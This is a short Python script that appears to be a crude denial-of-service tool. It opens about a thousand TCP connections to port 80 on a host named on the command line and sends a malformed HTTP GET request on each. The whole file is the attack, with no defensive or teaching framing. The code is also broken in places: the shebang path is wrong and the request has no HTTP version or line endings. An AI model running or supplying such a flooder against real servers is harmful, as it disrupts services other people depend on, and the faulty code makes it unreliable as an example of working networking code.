#!usr/bin/env python
import socket
import sys


def dosa():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((sys.argv[1],80))
    s.send("GET /"+sys.argv[2] +" packets")
    s.send("HOST: "+sys.argv[1])
    s.close()

for i in range(1,1000):
    dosa();
               
